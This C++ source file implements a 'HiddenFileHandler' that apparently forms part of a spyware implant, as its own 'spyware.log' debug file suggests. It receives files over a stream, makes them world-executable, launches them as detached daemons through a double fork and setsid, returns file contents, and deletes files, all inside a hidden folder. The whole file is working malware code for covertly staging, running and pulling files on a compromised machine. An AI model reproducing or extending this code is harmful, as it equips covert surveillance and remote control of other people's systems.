#include "HiddenFileHandler.h"

#define DEBUG

std::string HiddenFileHandler::getPath(const std::string fileName) {
    return folderName + "/" + fileName;
}

// Method to list the files in the directory
void HiddenFileHandler::listFiles() {
    // for (const auto& entry : fs::directory_iterator(folderName))
        // std::cout << entry.path() << std::endl;
}


Status HiddenFileHandler::runFile(const std::string& fileName) {
    std::string filePath = getPath(fileName);
    std::cerr << "path of file to run: " << filePath << std::endl;
    int pid = fork();
    if (pid < 0) {
        return HIDER_FORK_ERROR;
    }
    if (pid > 0){
        return SUCCSESS;
    }

    if (setsid() < 0) {
        std::cerr << "error setting setion" << std::endl;
        std::exit(EXIT_FAILURE);
    }

    pid = fork();
    if (pid < 0) {
        std::perror("Error forking second time");
        std::exit(EXIT_FAILURE);
    }
    if (pid > 0) {
        std::exit(EXIT_SUCCESS); // Exit the parent process
    }
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
#ifdef DEBUG
    int stdoutFile_fd = open("spyware.log", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (stdoutFile_fd == -1) {
        std::cerr << "failed to open stdout file spyware.log" << std::endl;
        std::exit(EXIT_FAILURE);
    }
    if (dup2(stdoutFile_fd, fileno(stdout)) == -1) {
        std::perror("Failed to redirect stdout to file");
        std::exit(EXIT_FAILURE);
    }
#endif
    std::cerr << "exec hidden file" << std::endl;
    if (execl(filePath.c_str(), "", NULL) == -1) {
        std::cerr << "didn't run hidden file, Error: " << strerror(errno) << std::endl;
        std::cerr << "address: " << filePath << std::endl;
    }
    std::exit(EXIT_FAILURE);
}


// Method to remove a file from the directory
Status HiddenFileHandler::deleteFile(const std::string& filename) {
    std::string filePath = getPath(filename);
    if (std::remove(filePath.c_str()) != 0) {
        return FILE_DELETION_ERROR;
    }
    return SUCCSESS;
}

Status HiddenFileHandler::retreiveFile(const std::string& filename) {
    const std::string filePath = getPath(filename);
    std::ifstream file(filePath, std::ios::binary);
    if (!file.is_open()) {
        std::cerr << "Failed to open the file." << std::endl;
        return FILE_NOT_OPEN_ERROR;
    }
    const std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    uint32_t fileSize = buffer.size();
    if (write(STDOUT_FILENO, &fileSize, sizeof(fileSize)) == -1) {
        std::cerr << "Error msg length" << std::endl;
        std::cerr << "Error: " << strerror(errno) << std::endl;
    }
    file.close();

    if ((write(STDOUT_FILENO, buffer.data(), fileSize)) == -1) {
        std::cerr << "Error msg length" << std::endl;
        std::cerr << "Error: " << strerror(errno) << std::endl;
    }

    return SUCCSESS;
}

Status HiddenFileHandler::uploadFile(const std::string& fileName, uint32_t fileSize, uint32_t writeMode) {
    char fileContent[CHUNK_SIZE] = { 0 };
    Status res = SUCCSESS;
    
    std::string filePath = getPath(fileName);
    std::ofstream outFile;
    if (writeMode == M_OVERWRITE) {
        outFile.open(filePath, std::ios::binary); // open and overwrite file
    }
    else if (writeMode == M_APPEND) {
        outFile.open(filePath, std::ios::binary | std::ios::app); // open and append file
    }
    else {
        return INVALID_WRITE_MODE;
    }

    if (!outFile) {
        std::cerr << strerror(errno) << std::endl;
        
        return FILE_NOT_OPEN_ERROR;
    }
    uint32_t ctr;
    int recvied = 1;
    for (ctr = 0; ctr < fileSize && res == SUCCSESS && recvied != 0; ctr += recvied)
    {
        int tranferAmount = MIN(sizeof(fileContent), fileSize - ctr);
        // TODO recv exact amount
        if ((recvied = read(STDIN_FILENO, fileContent, tranferAmount)) < 0) {
            std::cerr << "Error reciving file contesnt from socket" << std::endl;
            std::cerr << "Error: " << strerror(errno) << std::endl;
            res = RECV_FILE_CONTENT_ERROR;
        }
        outFile.write(fileContent, recvied);
        if (!outFile) {
            std::cerr << "Error writting to file " << std::endl;
            std::cerr << "Error: " << strerror(errno) << std::endl;
            res = FILE_WRITE_ERROR;
        }
        std::cerr << "read: " << ctr << std::endl;
    }
    std::cerr << "finnish read\n";
    outFile.close();


    if (res != SUCCSESS) {
        return res;
    }

    if (chmod(filePath.c_str(), S_IRWXU | S_IRWXG | S_IRWXO) != 0)
    {
        std::cerr << "Failed to set executable permission." << std::endl;
        return CHMOD_TO_EXE_ERROR;
    }
    return SUCCSESS;
}

void HiddenFileHandler::setFolderName(const std::string& name) {
    folderName = name;
}
